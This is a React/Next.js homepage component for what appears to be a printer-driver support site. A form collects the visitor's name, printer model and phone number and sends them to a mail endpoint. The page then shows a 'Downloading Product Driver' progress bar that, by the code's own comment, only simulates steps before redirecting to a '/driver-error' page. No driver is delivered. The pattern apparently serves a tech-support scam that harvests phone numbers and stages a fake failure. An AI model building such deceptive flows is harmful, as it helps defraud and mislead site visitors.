"use client";

import Image from "next/image";
import DriverHero from "./components/homepage/DriverHero";

import SupportTiles from "./components/homepage/SupportTiles";
import PrinterSetupSection from "./components/homepage/PrinterSetupSection";
import SupportCopySection from "./components/homepage/SupportCopySection";
// const hero = "/images/gif.gif";
import { useState } from "react";
import { useRouter } from "next/navigation";
import Footer from "./components/footer";
import Header from "./components/header";

export default function Home() {
  const router = useRouter();

  const [fullName, setFullName] = useState("");
  const [modelNumber, setModelNumber] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const [ok, setOk] = useState(null);

  const totalSteps = 3;

  const handleSubmit = async (e) => {
    e.preventDefault();

    setLoading(true);
    setOk(null);
    setStep(0);

    try {
      const res = await fetch("/api/contactmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fullName, modelNumber, phoneNumber }),
      });

      const data = await res.json();

      if (data && data.success) {
        // Simulate steps then redirect
        let currentStep = 0;
        const interval = setInterval(() => {
          currentStep++;
          setStep(currentStep);
          if (currentStep >= totalSteps) {
            clearInterval(interval);
            setTimeout(() => router.push("/driver-error"), 1000);
          }
        }, 2000);
      } else {
        setOk(false);
        setLoading(false);
      }
    } catch (err) {
      console.error(err);
      setOk(false);
      setLoading(false);
    }
  };

  return (
    <>
    
   <Header />
      {!loading ? (
       <>
        
         <DriverHero />
 <section className="py-10">
          <h2 className="text-center text-xl md:text-2xl font-semibold text-gray-800">
            Get started with the installation by downloading the right printer software.
          </h2>
          <div className="mx-auto mt-6 max-w-6xl">
            <div className="rounded-xl bg-white p-6 md:p-8 shadow-[0_10px_30px_rgba(0,0,0,0.08)] ring-1 ring-black/5">
              <form
                onSubmit={handleSubmit}
                className="bg-white p-6 rounded-2xl shadow-lg w-[95%] max-w-5xl"
              >
                <div className="grid gap-4 md:grid-cols-4">
                  <div className="flex flex-col">
                    <label className="font-medium text-gray-700">
                      Full Name <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      name="fullName"
                      placeholder="Full Name"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      required
                      className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                    />
                  </div>

                  <div className="flex flex-col">
                    <label className="font-medium text-gray-700">
                      Model Number <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      name="modelNumber"
                      placeholder="Model Number"
                      value={modelNumber}
                      onChange={(e) => setModelNumber(e.target.value)}
                      required
                      className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                    />
                  </div>

                  <div className="flex flex-col">
                    <label className="font-medium text-gray-700">
                      Phone Number <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="tel"
                      name="phoneNumber"
                      placeholder="Phone Number"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      required
                      className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                    />
                  </div>
                    <div className="flex flex-col">
                      <label className="font-medium text-gray-700">
                        &nbsp;
                    </label>
                  <button
                    type="submit" style={{ marginTop: 0 }}
                    className="bg-blue-600 text-white  rounded hover:bg-blue-700 transition"
                  >
                    Find Drivers
                  </button>

                  {ok === false && (
                    <span className="text-sm text-red-600">
                      Something went wrong. Please try again.
                    </span>
                  )}
                </div>
                </div>

              
              </form>
            </div>
          </div>
        </section>
         <SupportTiles />
      <PrinterSetupSection />
      <SupportCopySection />
       </>
      ) : (
        // Loading view with stepper
        <div className="min-h-screen grid md:grid-cols-3 bg-white">
          <div className="p-8 flex items-center justify-center">
            <h1 className="text-3xl font-bold">Driver Loading</h1>
          </div>
          <div className="p-8 flex flex-col items-center justify-center">
            <h3 className="text-xl">Downloading Product Driver</h3>
            <div
              style={{
                width: "80%",
                maxWidth: 400,
                height: 12,
                backgroundColor: "#e0e0e0",
                borderRadius: 8,
                overflow: "hidden",
                margin: "20px 0",
              }}
            >
              <div
                style={{
                  height: "100%",
                  width: `${(step / totalSteps) * 100}%`,
                  backgroundColor: "#4caf50",
                  transition: "width 0.5s ease-in-out",
                }}
              />
            </div>
            <p>
              {step} of {totalSteps} Please Wait…
            </p>
            <p>Connecting to Server</p>
          </div>
          <div className="p-8 flex items-center justify-center">
            {/* Ensure /public/hero.png exists */}
            <Image
              src="/images/gif.gif"
              alt="Product"
              width={708}
              height={395}
              priority
              className="object-contain"
            />
          </div>
        </div>
      )}

       <Footer />
    </>
  );
}
